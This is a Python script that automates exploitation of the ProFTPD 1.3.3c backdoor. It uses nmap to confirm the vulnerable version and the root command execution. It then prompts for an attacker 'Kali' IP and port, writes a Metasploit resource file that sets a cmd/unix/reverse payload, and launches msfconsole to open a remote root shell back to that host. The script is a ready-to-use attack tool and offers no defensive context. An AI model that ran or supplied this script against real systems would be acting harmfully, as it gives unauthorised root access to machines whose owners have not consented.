import subprocess
import sys
import os

def run_nmap_scan(ip_address, scan_name):
    # Initial Nmap scan command
    initial_scan_command = f"nmap -p21 -vv -sV -oN {scan_name}.txt {ip_address} > /dev/null 2>&1"
    # Nmap vulnerability scan command
    vulnerability_scan_command = f"nmap -Pn -p21 -vv -sV --script ftp-proftpd-backdoor -oN {scan_name}-vuln.txt {ip_address} > /dev/null 2>&1"
    
    try:
        # Execute the initial scan
        subprocess.check_call(initial_scan_command, shell=True)
        
        # Check for specific keywords in the scan report
        with open(f"{scan_name}.txt", "r") as file:
            scan_content = file.read()
            if "21/tcp" in scan_content and "open" in scan_content and "ftp" in scan_content and "ProFTPD 1.3.3c" in scan_content:
                print("Port 21 is open with ProFTPD 1.3.3c service.")
                
                # Execute the vulnerability scan
                subprocess.check_call(vulnerability_scan_command, shell=True)
                
                # Check the vulnerability scan report for specific keywords
                with open(f"{scan_name}-vuln.txt", "r") as vuln_file:
                    vuln_content = vuln_file.read()
                    if "Command:" in vuln_content and "id" in vuln_content and "Results:" in vuln_content and "uid=0(root)" in vuln_content:
                        print("Vulnerability found: ProFTPD 1.3.3c Backdoor.")
                        
                        # Prompt for kali-ip and kali-port
                        kali_ip = input("Enter Kali IP: ")
                        kali_port = input("Enter Kali Port: ")
                        
                        # Create msfconsole rc file with the exploit configuration
                        rc_commands = f"""use exploit/unix/ftp/proftpd_133c_backdoor
set payload cmd/unix/reverse
set RHOST {ip_address}
set LHOST {kali_ip}
set LPORT {kali_port}
clear
show options
sleep 5
clear
exploit
"""
                        with open("proftpd133c.rc", "w") as rc_file:
                            rc_file.write(rc_commands)
                        
                        # Execute msfconsole with the rc file
                        os.system("msfconsole -q -r proftpd133c.rc")
                    else:
                        print("No known vulnerabilities found.")
            else:
                print("Port 21 with ProFTPD 1.3.3c service is not found.")
                
    except subprocess.CalledProcessError as e:
        print("Error during scan:", str(e))

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python script.py <IP Address> <Scan Report Name>")
        sys.exit(1)
        
    ip_address = sys.argv[1]
    scan_name = sys.argv[2]
    run_nmap_scan(ip_address, scan_name)
